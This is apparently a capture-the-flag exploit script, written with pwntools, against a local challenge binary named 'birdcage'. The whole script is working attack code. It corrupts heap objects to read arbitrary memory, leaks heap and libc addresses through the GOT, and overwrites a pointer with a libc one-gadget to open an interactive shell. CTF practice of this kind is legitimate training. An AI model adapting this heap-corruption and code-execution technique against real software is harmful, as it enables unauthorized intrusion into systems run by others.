#!/bin/python3
from pwn import *

elf = ELF('./source/files/birdcage')
context.binary = elf

s=remote('127.0.0.1',40003)

s.sendlineafter('> ','capture 0 parrot')
s.sendlineafter(': ','hoge')
s.sendlineafter('> ','capture 1 parrot')
s.sendlineafter(': ','fuga')


def read(addr):
    s.sendlineafter('> ','release 0')
    s.sendlineafter('> ','capture 0 parrot')
    s.sendlineafter(': ', b'a'*0x10 + pack(0x31)+pack(0x604d08)+pack(addr))
    s.sendlineafter('> ','sing 1')
    v=s.recvline()[:-1]
    print(v)
    return unpack(v.ljust(8,b'\0'))

print(elf.symbols.cage)
heap = read(elf.symbols.cage) - 0x10
print('heap:',hex(heap))

start = read(elf.got.__libc_start_main)
libc = ELF('./libc-2.27.so')
libc_base = start - libc.symbols.__libc_start_main
print('libc_base:',hex(libc_base))

rce = libc_base + 0x4f322
s.sendlineafter('> ', 'release 0')
s.sendlineafter('> ', 'capture 0 parrot')
s.sendlineafter(': ', b'a'*0x10 + pack(0x31)+pack(heap+0x48)+pack(rce))
s.sendlineafter('> ', ' sing 1')

s.interactive()
